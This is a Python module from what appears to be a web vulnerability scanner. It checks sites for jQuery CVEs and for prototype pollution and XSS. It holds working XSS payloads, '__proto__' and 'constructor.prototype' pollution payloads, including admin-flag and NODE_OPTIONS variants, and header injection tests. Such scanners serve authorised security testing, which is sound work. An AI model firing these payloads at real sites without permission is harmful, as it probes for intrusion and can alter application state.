"""
ppmap/scanner/tier0_basic.py - Tier 0: Basic Detection
"""
import time
import json
import urllib.parse
import logging
import random
from typing import Dict, List, Any
from selenium.common.exceptions import UnexpectedAlertPresentException

from ppmap.models.findings import Finding, VulnerabilityType, Severity
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors, progress_iter
from ppmap.payloads.base import XSS_PAYLOADS, DEFAULT_XSS_PARAMS
from ppmap.config.settings import CONFIG
from ppmap.utils.rate_limit import rate_limited
from ppmap.utils.retry import retry_request
from selenium.common.exceptions import TimeoutException, WebDriverException
import re

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

# In a real scenario, extract_jquery_versions_robust should be moved to helpers.py,
# but for now we can import it from core to avoid breaking other things
from ppmap.scanner.core import extract_jquery_versions_robust

logger = logging.getLogger(__name__)

class Tier0BasicScanner(BaseTierScanner):
    @property
    def tier_name(self) -> str:
        return "Tier 0 - Basic Detection"

    def __init__(self):
        super().__init__()
        self.param_discovery = None

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.driver = ctx.driver
        self.session = ctx.session
        self.timeout = ctx.config.timeout
        self.metrics = ctx.legacy_metrics  # to mock self.metrics.total_requests
        
        # In a real refactoring we initialize param_discovery properly
        from ppmap.discovery import ParameterDiscovery
        self.param_discovery = ParameterDiscovery(self.session)
        
        all_findings = []
        
        findings0 = self.test_jquery_prototype_pollution()
        findings1 = self.test_xss_with_details(ctx.target_url)
        findings2 = self.test_post_parameters(ctx.target_url)
        findings3 = self.test_server_side_prototype_pollution(ctx.target_url, request_data=ctx.request_data)
        findings4 = self.test_dom_xss_with_pp(ctx.target_url)
        findings5 = self.test_hash_based_pp(ctx.target_url)
        findings6 = self.test_with_waf_bypass(ctx.target_url)
        findings7 = self.test_deep_chain_pollution(ctx.target_url)
        findings8 = self.test_http_header_pollution(ctx.target_url)

        all_findings.extend(findings0)
        all_findings.extend(findings1)
        all_findings.extend(findings2)
        all_findings.extend(findings3)
        all_findings.extend(findings4)
        all_findings.extend(findings5)
        all_findings.extend(findings6)
        all_findings.extend(findings7)
        all_findings.extend(findings8)
        
        # Fix missing finding conversions
        final_findings = []
        for f in all_findings:
            if isinstance(f, dict):
                finding_type = f.get('type', 'PROTOTYPE_POLLUTION')
                
                # Determine intelligent name
                name = f.get('name')
                if not name:
                    if finding_type == 'server_side_pp':
                        name = f"Server-Side PP via {f.get('method', 'Unknown Method')}"
                        if f.get('param'):
                            name += f" (Parameter: '{f.get('param')}')"
                    elif finding_type == 'post_xss':
                        name = f"POST XSS via '{f.get('param', 'unknown')}' parameter"
                    elif finding_type == 'deep_chain_pp':
                        name = "Deep Chain Prototype Pollution"
                    elif finding_type == 'http_header_pp':
                        name = "HTTP Header Prototype Pollution"
                    elif finding_type == 'hash_based_pp':
                        name = "Hash-based Prototype Pollution (WAF Bypass)"
                    else:
                        name = f.get('description', 'Tier 0 Finding')

                # Determine description
                desc = f.get('description')
                if not desc:
                    desc = f"Detected {finding_type} vulnerability. Attack method: {f.get('method', 'Unknown')}"
                    if f.get('evidence'):
                        desc += f"\nEvidence: {f.get('evidence')}"
                
                final_findings.append(Finding(
                    name=name,
                    severity=getattr(Severity, f.get('severity', 'HIGH').upper(), Severity.HIGH),
                    type=getattr(VulnerabilityType, finding_type.upper(), VulnerabilityType.PROTOTYPE_POLLUTION),
                    url=f.get('url', f.get('test_url', ctx.target_url)),
                    method=f.get('method', ''),
                    payload=str(f.get('payload', '')),
                    evidence=str(f.get('evidence', '')),
                    description=desc,
                    verified=f.get('verified', False)
                ))
            else:
                final_findings.append(f)
                
        return final_findings

    # Helper methods expected by these legacy functions:
    def verify_prototype_pollution(self, prop_name: str) -> bool:
        if not hasattr(self, 'driver') or not self.driver:
            return False
        try:
            return self.driver.execute_script(f"return Object.prototype.hasOwnProperty('{prop_name}');") is True
        except:
            return False

    def verify_sspp(self, target_url: str) -> dict:
        canary = f"ppmap_sspp"
        try:
            self.session.post(target_url, json={"__proto__": {canary: "ppmap_verified"}}, timeout=self.timeout, verify=False)
            if canary in self.session.get(target_url, timeout=self.timeout, verify=False).text:
                return {"polluted": True, "canary": canary}
        except:
            pass
        return {"polluted": False, "canary": canary}

    def snapshot_object_prototype(self):
        return None
    def restore_object_prototype(self, snapshot):
        pass
    def detect_gadget_type(self, payload):
        return "generic"

    def test_jquery_prototype_pollution(self) -> List[Finding]:
        """
        Test jQuery Prototype Pollution (CVE-2019-11358 and others) with proper CVE detection.
        This function performs the following steps:
        1. Detects the jQuery version using a robust multi-method approach.
        2. Identifies potential CVEs based on the detected jQuery version.
        3. Attempts to verify the vulnerabilities using browser-based tests.
        4. Returns a list of Finding objects.
        """
        print(f"{Colors.CYAN}[→] Testing jQuery Prototype Pollution...{Colors.ENDC}")

        findings: List[Finding] = []

        # Step 1: Detect jQuery version using ROBUST multi-method approach
        page_source = ""
        try:
            if hasattr(self, "driver") and self.driver:
                page_source = self.driver.page_source
        except Exception as e:
            logger.debug(f"Failed to get page source from driver: {e}")

        # Use robust detection function
        jquery_detection = extract_jquery_versions_robust(page_source, self.driver)
        jquery_version = jquery_detection.get('recommended')
        
        # Log all detected versions for debugging
        if jquery_detection.get('all_versions'):
            versions_str = ", ".join(sorted(jquery_detection['all_versions']))
            print(
                f"{Colors.BLUE}[*] jQuery versions detected: {versions_str} (Method: {jquery_detection.get('detection_method', 'unknown')}){Colors.ENDC}"
            )
            if jquery_detection.get('dynamic') and jquery_detection['dynamic'] != jquery_version:
                print(
                    f"{Colors.WARNING}[!] Dynamic load detected: {jquery_detection['dynamic']} (different from recommended {jquery_version}){Colors.ENDC}"
                )
        
        # Handle RequireJS as well (from page source)
        try:
            if page_source:
                requirejs_patterns = [
                    r"requirejs[/-]([\d]+\.[\d]+(?:\.[\d]+)?)",
                    r"require\.js.*?([\d]+\.[\d]+(?:\.[\d]+)?)",
                    r"RequireJS ([\d]+\.[\d]+(?:\.[\d]+)?)",
                ]
                for r_pat in requirejs_patterns:
                    r_match = re.search(r_pat, page_source, re.IGNORECASE)
                    if r_match:
                        r_ver = r_match.group(1)
                        print(
                            f"{Colors.BLUE}[*] RequireJS {r_ver} detected!{Colors.ENDC}"
                        )
                        try:
                            r_parts = [int(x) for x in r_ver.split(".")[:3]]
                            r_tuple = tuple(r_parts + [0] * (3 - len(r_parts)))
                            if r_tuple <= (2, 3, 6):
                                print(
                                    f"{Colors.FAIL}[!] VULNERABLE: RequireJS {r_ver} (CVE-2024-38999 - Prototype Pollution){Colors.ENDC}"
                                )
                                findings.append(
                                    Finding(
                                        type=VulnerabilityType.PROTOTYPE_POLLUTION,
                                        name="RequireJS Prototype Pollution",
                                        severity=Severity.CRITICAL,
                                        description=f"RequireJS {r_ver} is vulnerable to prototype pollution (CVE-2024-38999).",
                                    )
                                )
                        except Exception as e:
                            logger.debug(f"RequireJS version check error: {e}")
                        break
        except Exception as e:
            logger.debug(f"RequireJS detection error: {e}")

        if not jquery_version:
            print(f"{Colors.GREEN}[✓] jQuery not detected{Colors.ENDC}")
            return findings

        # Step 2: CVE IDENTIFICATION
        # BUG-1 FIX: parse full (major, minor, patch) tuple for accurate version compare
        cve_vulnerabilities = []

        try:
            ver_parts = jquery_version.split(".")
            ver_tuple = tuple(int(x) for x in ver_parts[:3])
            # Pad to 3 elements
            while len(ver_tuple) < 3:
                ver_tuple = ver_tuple + (0,)
            major, minor, patch = ver_tuple

            # CVE-2019-11358: Prototype Pollution (jQuery < 3.4.0)
            if ver_tuple < (3, 4, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2019-11358 (Prototype Pollution){Colors.ENDC}"
                )
                print(f"    jQuery {jquery_version} < 3.5.0 is vulnerable!")
                cve_vulnerabilities.append(
                    Finding(
                        type=VulnerabilityType.PROTOTYPE_POLLUTION,
                        name="Prototype Pollution in jQuery $.extend()",
                        severity=Severity.CRITICAL,
                        description=f"jQuery {jquery_version} is vulnerable to prototype pollution (CVE-2019-11358).",
                        cve="CVE-2019-11358",
                    )
                )

            # CVE-2020-11022: HTML Prefilter XSS (jQuery < 3.5.0)
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2020-11022 (HTML Prefilter XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    Finding(
                        type=VulnerabilityType.XSS,
                        name="HTML Prefilter XSS in jQuery",
                        severity=Severity.HIGH,
                        description=f"jQuery {jquery_version} is vulnerable to HTML Prefilter XSS (CVE-2020-11022).",
                        cve="CVE-2020-11022",
                    )
                )

            # BUG-6 FIX CORRECTED: CVE-2020-11023 affects jQuery < 3.5.0 (NOT only == 3.5.0)
            # Original bug: `ver_tuple == (3, 5, 0)` missed all versions < 3.5.0 (including 1.12.4!)
            # See: https://nvd.nist.gov/vuln/detail/CVE-2020-11023 — affected: < 3.5.0
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2020-11023 (<option> XSS in jQuery.html()){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    Finding(
                        type=VulnerabilityType.XSS,
                        name="jQuery.html() <option> element XSS",
                        severity=Severity.HIGH,
                        description=f"jQuery {jquery_version} is vulnerable to XSS via the <option> element (CVE-2020-11023).",
                        cve="CVE-2020-11023",
                    )
                )

            # CVE-2020-23064: XSS via DOM manipulation methods (jQuery < 3.5.0)
            # This CVE was completely missing from ppmap. Related to CVE-2020-11023:
            # .before(), .after(), .replaceWith(), etc. do not sanitize HTML input.
            # See: https://nvd.nist.gov/vuln/detail/CVE-2020-23064
            if ver_tuple < (3, 5, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2020-23064 (DOM Manipulation XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    Finding(
                        type=VulnerabilityType.XSS,
                        name="jQuery DOM Manipulation XSS (.before/.after/.replaceWith)",
                        severity=Severity.HIGH,
                        description=f"jQuery {jquery_version} is vulnerable to DOM Manipulation XSS (CVE-2020-23064).",
                        cve="CVE-2020-23064",
                    )
                )

            # CVE-2015-9251: Cross-domain AJAX auto-eval (jQuery < 3.0.0)
            # BUG FIX: Original range was `< (2, 2, 0)` — too narrow. Actual affected range: < 3.0.0
            # This CVE is about auto-eval of text/javascript AJAX responses, NOT CSS import.
            # See: https://nvd.nist.gov/vuln/detail/CVE-2015-9251
            if ver_tuple < (3, 0, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2015-9251 (Cross-domain AJAX auto-eval XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    Finding(
                        type=VulnerabilityType.XSS,
                        name="jQuery Cross-domain AJAX auto-eval XSS",
                        severity=Severity.HIGH,
                        description=f"jQuery {jquery_version} is vulnerable to Cross-domain AJAX auto-eval XSS (CVE-2015-9251).",
                        cve="CVE-2015-9251",
                    )
                )

            # CVE-2012-6708: $.parseJSON XSS (jQuery < 1.9.0)
            if ver_tuple < (1, 9, 0):
                print(
                    f"{Colors.FAIL}[!] VULNERABLE to CVE-2012-6708 ($.parseJSON XSS){Colors.ENDC}"
                )
                cve_vulnerabilities.append(
                    Finding(
                        type=VulnerabilityType.XSS,
                        name="jQuery $.parseJSON XSS",
                        severity=Severity.MEDIUM,
                        description=f"jQuery {jquery_version} is vulnerable to XSS via $.parseJSON (CVE-2012-6708).",
                        cve="CVE-2012-6708",
                    )
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] CVE version check error: {e}{Colors.ENDC}")
            logger.debug(f"CVE version check error detail: {e}")

        # BUG-8 FIX: Don't extend findings here — browser-verified step below will add
        # them with 'verified' flag to avoid duplicates. Only add if no browser available.
        # findings.extend(cve_vulnerabilities)  <- REMOVED: caused triple duplicates

        # Step 3: Snapshot Object.prototype before testing
        try:
            self.prototype_snapshot = self.snapshot_object_prototype()
        except Exception:
            self.prototype_snapshot = None

        # Step 4: jQuery $.extend() vulnerability test (CVE-2019-11358)
        if any(c.cve == "CVE-2019-11358" for c in cve_vulnerabilities):  # Only if version vulnerable
            rand_id = f"pp_{int(time.time())}"

            js_check = f"""
            try {{
                $.extend(true, {{}}, JSON.parse('{{"__proto__": {{"{rand_id}": true}}}}'));
                var result = Object.prototype.{rand_id} === true;
                delete Object.prototype.{rand_id};
                return result;
            }} catch(e) {{ return false; }}
            """

            try:
                if self.driver.execute_script(js_check):
                    print(
                        f"{Colors.FAIL}[!] $.extend() confirms Prototype Pollution vulnerability!{Colors.ENDC}"
                    )
                    findings.append(
                        Finding(
                            type=VulnerabilityType.PROTOTYPE_POLLUTION,
                            name="jQuery $.extend() Prototype Pollution VERIFIED",
                            severity=Severity.CRITICAL,
                            description=f"jQuery {jquery_version} is vulnerable to prototype pollution (CVE-2019-11358).",
                            cve="CVE-2019-11358",
                            verified=True,
                        )
                    )
            except Exception as e:
                logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        # Step 5: Browser-based XSS verification tests per CVE
        # Run each CVE's specific payload independently for accurate reporting
        # ------------------------------------------------------------------

        # CVE-2020-11022: HTML Prefilter bypass via <style> + <img onerror>
        # BUG FIX: Old payload `<option><style></option><img onerror>` is actually CVE-2020-11023.
        # CVE-2020-11022 specific: bypass htmlPrefilter regex using self-closing style tag.
        if any(c.cve == "CVE-2020-11022" for c in cve_vulnerabilities):
            m = f"cve11022_{int(time.time())}"
            js_11022 = f"""
            try {{
                window.{m} = false;
                var el = $('<div>').css('display','none').appendTo('body');
                el.html('<style></style><img src=x onerror="window.{m}=true">');
                var r = window.{m} === true;
                el.remove(); delete window.{m};
                return r;
            }} catch(e) {{ return false; }}
            """
            try:
                if self.driver.execute_script(js_11022):
                    print(
                        f"{Colors.FAIL}[!] CVE-2020-11022 VERIFIED: htmlPrefilter bypass XSS executed!{Colors.ENDC}"
                    )
                    findings.append(
                        Finding(
                            type=VulnerabilityType.XSS,
                            name="jQuery htmlPrefilter XSS (VERIFIED)",
                            severity=Severity.HIGH,
                            description=f"jQuery {jquery_version} is vulnerable to HTML Prefilter XSS (CVE-2020-11022).",
                            cve="CVE-2020-11022",
                            verified=True,
                            payload="$('<div>').appendTo('body').html('<style></style><img src=x onerror=alert(1)>')",
                        )
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2020-11022: Version vulnerable, XSS payload did not execute (CSP or sandbox may block){Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2020-11022 browser test error: {e}")

        # CVE-2020-11023: <option> element XSS
        # The <option><style></option><img onerror> pattern is specific to this CVE.
        if any(c.cve == "CVE-2020-11023" for c in cve_vulnerabilities):
            m = f"cve11023_{int(time.time())}"
            js_11023 = f"""
            try {{
                window.{m} = false;
                var el = $('<select>').css('display','none').appendTo('body');
                el.html('<option><img src=x onerror="window.{m}=true"></option>');
                var r = window.{m} === true;
                el.remove(); delete window.{m};
                return r;
            }} catch(e) {{ return false; }}
            """
            try:
                if self.driver.execute_script(js_11023):
                    print(
                        f"{Colors.FAIL}[!] CVE-2020-11023 VERIFIED: <option> element XSS executed!{Colors.ENDC}"
                    )
                    findings.append(
                        Finding(
                            type=VulnerabilityType.XSS,
                            name="jQuery <option> element XSS (VERIFIED)",
                            severity=Severity.HIGH,
                            description=f"jQuery {jquery_version} is vulnerable to XSS via the <option> element (CVE-2020-11023).",
                            cve="CVE-2020-11023",
                            verified=True,
                            payload="$('<select>').appendTo('body').html('<option><img src=x onerror=alert(1)></option>')",
                        )
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2020-11023: Version vulnerable, <option> XSS payload did not execute{Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2020-11023 browser test error: {e}")

        # CVE-2020-23064: DOM manipulation XSS via .append() with raw img
        # Tests .append() without prior sanitization — sibling of CVE-2020-11023
        if any(c.cve == "CVE-2020-23064" for c in cve_vulnerabilities):
            m = f"cve23064_{int(time.time())}"
            js_23064 = f"""
            try {{
                window.{m} = false;
                var el = $('<div>').css('display','none').appendTo('body');
                el.append('<img/><img src=x onerror="window.{m}=true">');
                var r = window.{m} === true;
                el.remove(); delete window.{m};
                return r;
            }} catch(e) {{ return false; }}
            """
            try:
                if self.driver.execute_script(js_23064):
                    print(
                        f"{Colors.FAIL}[!] CVE-2020-23064 VERIFIED: DOM manipulation XSS executed via .append()!{Colors.ENDC}"
                    )
                    findings.append(
                        Finding(
                            type=VulnerabilityType.XSS,
                            name="jQuery DOM Manipulation XSS (VERIFIED)",
                            severity=Severity.HIGH,
                            description=f"jQuery {jquery_version} is vulnerable to DOM Manipulation XSS (CVE-2020-23064).",
                            cve="CVE-2020-23064",
                            verified=True,
                            payload="$('<div>').appendTo('body').append('<img/><img src=x onerror=alert(1)>')",
                        )
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2020-23064: Version vulnerable, DOM XSS payload did not execute{Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2020-23064 browser test error: {e}")

        # CVE-2015-9251: Check if AJAX text/javascript auto-eval converter is active
        # This checks for the presence of the vulnerable converter in jQuery's settings.
        # Full exploitation requires cross-domain AJAX, but we can verify the converter exists.
        if any(c.cve == "CVE-2015-9251" for c in cve_vulnerabilities):
            js_9251 = """
            try {
                var conv = jQuery && jQuery.ajaxSettings && jQuery.ajaxSettings.converters;
                return conv && typeof conv["text script"] === 'function';
            } catch(e) { return false; }
            """
            try:
                if self.driver.execute_script(js_9251):
                    print(
                        f"{Colors.FAIL}[!] CVE-2015-9251 VERIFIED: text/javascript auto-eval converter ACTIVE in jQuery!{Colors.ENDC}"
                    )
                    findings.append(
                        Finding(
                            type=VulnerabilityType.XSS,
                            name="jQuery AJAX auto-eval converter Active (CVE-2015-9251)",
                            severity=Severity.MEDIUM,
                            description=f"jQuery {jquery_version} is vulnerable to Cross-domain AJAX auto-eval XSS (CVE-2015-9251).",
                            cve="CVE-2015-9251",
                            verified=True,
                            payload='typeof jQuery.ajaxSettings.converters["text script"] === "function"  // returns true',
                        )
                    )
                else:
                    print(
                        f"{Colors.YELLOW}[*] CVE-2015-9251: Converter not active or jQuery not accessible{Colors.ENDC}"
                    )
            except Exception as e:
                logger.debug(f"CVE-2015-9251 browser test error: {e}")

        # Restore snapshot if available
        try:
            if self.prototype_snapshot:
                self.restore_object_prototype(self.prototype_snapshot)
        except Exception as e:
            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        # BUG-8 FIX: If no browser-verified findings but CVEs detected by version, report them
        if not findings and cve_vulnerabilities:
            # Add version-based CVE findings (not browser-verified)
            findings.extend(cve_vulnerabilities)

        if not findings:
            print(f"{Colors.GREEN}[✓] No jQuery vulnerabilities detected{Colors.ENDC}")
        else:
            print(
                f"{Colors.FAIL}[!] Total jQuery CVEs found: {len(findings)}{Colors.ENDC}"
            )

        return findings

    @rate_limited()
    def test_xss_with_details(self, base_url) -> List[Finding]:
        """Test XSS vulnerabilities with execution-based verification (NOT text search)"""
        print(f"{Colors.CYAN}[→] Testing XSS payloads...{Colors.ENDC}")

        findings: List[Finding] = []

        # Discover parameters dynamically from HTML forms
        print(f"{Colors.BLUE}[*] Discovering parameters from forms...{Colors.ENDC}")
        test_params = self.param_discovery.analyze_forms(base_url)

        if test_params:
            print(
                f"{Colors.GREEN}[✓] Discovered {len(test_params)} parameters: {', '.join(test_params[:5])}{Colors.ENDC}"
            )
        else:
            print(
                f"{Colors.YELLOW}[!] No parameters found, using defaults{Colors.ENDC}"
            )
            test_params = DEFAULT_XSS_PARAMS

        # Limit to first 5 parameters to avoid timeout
        test_params = test_params[:5]

        # Use execution-based XSS detection, not text search!
        iterator = (
            tqdm(test_params, desc="Testing XSS Params", unit="param")
            if tqdm
            else test_params
        )
        for param in iterator:
            for payload in XSS_PAYLOADS[:2]:
                # Create a unique marker that will be set if XSS is executed
                marker = f"xss_success_{int(time.time() * 1000)}"

                # Modify payload to set a global flag if executed
                # Escape payload for JavaScript (extract outside f-string)
                escaped_payload = payload.replace('"', '\\"')
                js_payload = f"""
window.{marker} = false;
var d = document.createElement('div');
d.style.display = 'none';
document.body.appendChild(d);
try {{
    d.innerHTML = "{escaped_payload}";
    // Check if script executed or event fired
    if (window['{marker}'] === true) {{
        d.remove();
        window['{marker}'] = true;
    }} else {{
        // Try with different method
        var result = d.innerHTML.includes("alert") || d.innerHTML.includes("onerror");
        d.remove();
        window['{marker}'] = result;
    }}
}} catch(e) {{
    d.remove();
}}
return window['{marker}'];
"""

                if "?" in base_url:
                    test_url = (
                        f"{base_url}&{param}={urllib.parse.quote(payload, safe='')}"
                    )
                else:
                    test_url = (
                        f"{base_url}?{param}={urllib.parse.quote(payload, safe='')}"
                    )

                # Retry loop to handle navigation errors
                for attempt in range(3):
                    try:
                        # --- FIX BUG-1: Flush any pre-existing PP-triggered alerts ---
                        # PP tests run earlier may have polluted Object.prototype so
                        # navigating any URL can trigger alert(1). Load clean URL first.
                        try:
                            self.driver.get(base_url)
                            time.sleep(0.8)
                            for _ in range(5):
                                try:
                                    self.driver.switch_to.alert.accept()
                                except Exception:
                                    break
                        except Exception:
                            pass

                        # PP artifact alert values — never count as real XSS
                        _pp_artifacts = {'1', '', 'null', 'undefined', 'true', 'false'}
                        try:
                            _pp_artifacts.add(base_url.split('//')[1].split('/')[0])
                        except Exception:
                            pass

                        self.driver.get(test_url)
                        self.metrics.total_requests += 1
                        time.sleep(1 + attempt)  # Increase wait on retry

                        # Instead of just relying on JS injection via innerHTML containing payload,
                        # properly check if the initial get() triggered an alert.
                        from selenium.webdriver.support.ui import WebDriverWait
                        from selenium.webdriver.support import expected_conditions as EC
                        try:
                            WebDriverWait(self.driver, 1.5).until(EC.alert_is_present())
                            alert_text = self.driver.switch_to.alert.text
                            self.driver.switch_to.alert.accept()

                            # --- FIX BUG-1: Filter PP artifact alerts ---
                            # If alert text is '1' or the domain, it came from PP pollution
                            # triggered in background — not from the XSS payload.
                            alert_str = str(alert_text) if alert_text is not None else ''
                            if alert_str in _pp_artifacts:
                                logger.info(
                                    f"XSS alert '{alert_str}' is a PP artifact, not reflected XSS — skipping"
                                )
                                break

                            # Additionally verify payload is actually reflected in page source
                            try:
                                pg_src = self.driver.page_source
                                if not (
                                    payload[:15] in pg_src
                                    or urllib.parse.quote(payload[:15], safe='') in pg_src
                                ):
                                    logger.info(
                                        f"XSS alert fired but payload not reflected in DOM — PP side-effect, skipping"
                                    )
                                    break
                            except Exception:
                                pass

                            print(
                                f"{Colors.FAIL}[!] XSS FOUND (Alert Triggered): {param}={payload[:40]}{Colors.ENDC}"
                            )
                            findings.append(
                                Finding(
                                    type=VulnerabilityType.XSS,
                                    name=f"Reflected XSS in '{param}' parameter",
                                    severity=Severity.HIGH,
                                    description=f"The parameter '{param}' is vulnerable to reflected XSS. Alert triggered successfully.",
                                    payload=payload,
                                    url=test_url,
                                    verified=True,
                                    metadata={"alert_triggered": True, "alert_text": alert_text}
                                )
                            )
                            break
                        except Exception:
                            # No alert triggered directly. Check if it's reflected as text
                            page_source = self.driver.page_source
                            if payload in page_source:
                                # It's only reflected as text. NOT executable XSS.
                                print(f"{Colors.GREEN}[✓] Payload reflected as text, but no XSS execution: {param}{Colors.ENDC}")
                                break
                            
                            # Break retry loop as page loaded fine and no alert was found.
                            break
                        except Exception as exec_e:
                            # Fallback: check if payload appears to be reflected in DOM
                            try:
                                page_source = self.driver.page_source
                                # Only mark as XSS if payload is reflected AND contains executable pattern
                                if payload in page_source and (
                                    "<script" in payload
                                    or "onerror" in payload
                                    or "onload" in payload
                                ):
                                    print(
                                        f"{Colors.WARNING}[⚠] Potential XSS: {param}={payload[:40]} (reflected in page){Colors.ENDC}"
                                    )
                                break
                            except Exception:
                                pass

                            # If execute_script failed with navigation error, it bubbles up to outer except
                            raise exec_e

                    except Exception as e:
                        err_msg = str(e)
                        if (
                            "aborted by navigation" in err_msg
                            or "Connection reset" in err_msg
                            or "browsing context has been discarded" in err_msg
                        ):
                            if attempt < 2:
                                # print(f"{Colors.YELLOW}[~] Retry {attempt+1}/3 for {param} due to navigation error...{Colors.ENDC}")
                                continue
                        else:
                            print(
                                f"{Colors.WARNING}[⚠] Error testing {param}: {err_msg[:50]}{Colors.ENDC}"
                            )
                            break

        if not findings:
            print(f"{Colors.GREEN}[✓] No confirmed XSS detected{Colors.ENDC}")
        return findings

    @rate_limited()
    @retry_request(
        max_attempts=3, backoff=1.5, exceptions=(TimeoutException, WebDriverException)
    )
    def test_post_parameters(self, base_url) -> List[Dict[str, Any]]:
        """Test POST parameters for XSS and PP vulnerabilities"""
        print(f"{Colors.CYAN}[→] Testing POST parameters...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []

        try:
            # Discover which forms use POST
            self.driver.get(base_url)
            time.sleep(1)

            # Find POST forms
            forms = json.loads(self.driver.execute_script("""
                return JSON.stringify(Array.from(document.querySelectorAll('form')).map(form => ({
                    method: (form.method || 'GET').toUpperCase(),
                    action: form.action || window.location.pathname,
                    inputs: Array.from(form.querySelectorAll('input, textarea')).map(inp => ({
                        name: inp.name,
                        type: inp.type,
                        value: inp.value
                    }))
                })));
            """))

            if not forms:
                print(f"{Colors.YELLOW}[!] No POST forms found{Colors.ENDC}")
                return findings

            # Test each POST form
            for form_idx, form in enumerate(forms):
                if form["method"] != "POST":
                    continue

                print(
                    f"{Colors.BLUE}[*] Testing POST form #{form_idx + 1}{Colors.ENDC}"
                )

                # Extract parameter names
                post_params = [inp["name"] for inp in form["inputs"] if inp["name"]]

                if not post_params:
                    continue

                # Test each parameter with XSS payload
                for param in post_params[:3]:  # Limit to first 3 POST params
                    for payload in CONFIG["xss_payloads"][
                        :1
                    ]:  # Test only first payload for POST
                        marker = f"post_xss_{int(time.time() * 1000)}"

                        try:
                            # Escape payload for JavaScript (extract outside f-string)
                            escaped_payload = payload.replace('"', '\\"')
                            post_script = f"""
                            return new Promise(resolve => {{
                                window.{marker} = false;
                                const form = document.querySelector('form');
                                if (form) {{
                                    const input = form.querySelector('input[name=\"{param}\"]') || document.createElement('input');
                                    input.value = "{escaped_payload}";
                                    // Create hidden container to check execution
                                    const container = document.createElement('div');
                                    container.style.display = 'none';
                                    container.innerHTML = input.value;
                                    document.body.appendChild(container);
                                    // Check if payload executed
                                    setTimeout(() => {{
                                        container.remove();
                                        resolve(window.{marker} === true);
                                    }}, 500);
                                }} else {{
                                    resolve(false);
                                }}
                            }});
                            """

                            result = self.driver.execute_script(post_script)
                            if result:
                                print(
                                    f"{Colors.FAIL}[!] POST XSS FOUND: {param}={payload[:40]}{Colors.ENDC}"
                                )
                                findings.append(
                                    {
                                        "type": "post_xss",
                                        "param": param,
                                        "payload": payload,
                                        "severity": "HIGH",
                                        "method": "POST",
                                    }
                                )
                        except UnexpectedAlertPresentException:
                            print(f"{Colors.FAIL}[!] POST XSS FOUND (Alert Triggered): {param}={payload[:40]}{Colors.ENDC}")
                            findings.append(
                                {
                                    "type": "post_xss",
                                    "param": param,
                                    "payload": payload,
                                    "severity": "HIGH",
                                    "method": "POST",
                                }
                            )
                            try:
                                self.driver.switch_to.alert.accept()
                            except Exception:
                                pass
                        except Exception as e:
                            logger.debug(f"Ignored error: {type(e).__name__} - {e}")
                            
        except UnexpectedAlertPresentException:
            pass
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Error testing POST parameters: {str(e)[:50]}{Colors.ENDC}"
            )

        if not findings:
            print(f"{Colors.GREEN}[✓] No POST vulnerabilities detected{Colors.ENDC}")
        return findings

    def test_deep_chain_pollution(self, base_url: str) -> List[Dict[str, Any]]:
        """Phase 9: Fuzz endpoints with multi-level nested prototype injection."""
        print(f"{Colors.BLUE}[*] Testing Deep Chain Prototype Pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        marker = f"dyn_deep_{int(time.time())}_{random.randint(1000,9999)}"
        
        deep_payloads = [
            {"__proto__": {"config": {"request": {"url": marker}}}},
            {"constructor": {"prototype": {"options": {"headers": {"test": marker}}}}},
            {"__proto__": {"data": {"user": {"isAdmin": marker}}}},
            {"constructor": {"prototype": {"env": {"NODE_OPTIONS": marker}}}}
        ]
        
        for payload in deep_payloads:
            try:
                response = self.session.post(base_url, json=payload, timeout=5, verify=False)
                self.metrics.total_requests += 1
                if marker in response.text:
                    findings.append({
                        "type": "deep_chain_pp",
                        "severity": "CRITICAL",
                        "payload": payload,
                        "verified": True,
                        "description": "Deep Chain Object Pollution successfully breached parsing boundaries."
                    })
                    print(f"{Colors.FAIL}[!] DEEP CHAIN PP FOUND: {payload}{Colors.ENDC}")
            except Exception as e:
                logger.debug(f"Deep chain test error: {e}")
                
        if not findings:
            print(f"{Colors.GREEN}[✓] No Deep Chain Prototype Pollution detected.{Colors.ENDC}")
        return findings

    def test_http_header_pollution(self, base_url: str) -> List[Dict[str, Any]]:
        """Phase 9: Fuzz endpoints via HTTP Header Prototype Pollution injection."""
        print(f"{Colors.BLUE}[*] Testing HTTP Header Prototype Pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        marker = f"dyn_hdr_{int(time.time())}_{random.randint(1000,9999)}"
        
        test_headers = [
            {"__proto__[admin]": "true", "X-Forwarded-For": "127.0.0.1"},
            {"__proto__.polluted": marker, "Content-Type": "application/json"},
            {"Cookie": f"__proto__[auth]={marker}"}
        ]
        
        for headers in test_headers:
            try:
                # Merge with session headers to not lose User-Agent, etc.
                merged_headers = self.session.headers.copy()
                merged_headers.update(headers)
                
                response = self.session.get(base_url, headers=merged_headers, timeout=5, verify=False)
                self.metrics.total_requests += 1
                
                if marker in response.text or "Error establishing a Redis connection" in response.text:
                    findings.append({
                        "type": "http_header_pp",
                        "severity": "HIGH",
                        "payload": headers,
                        "verified": True,
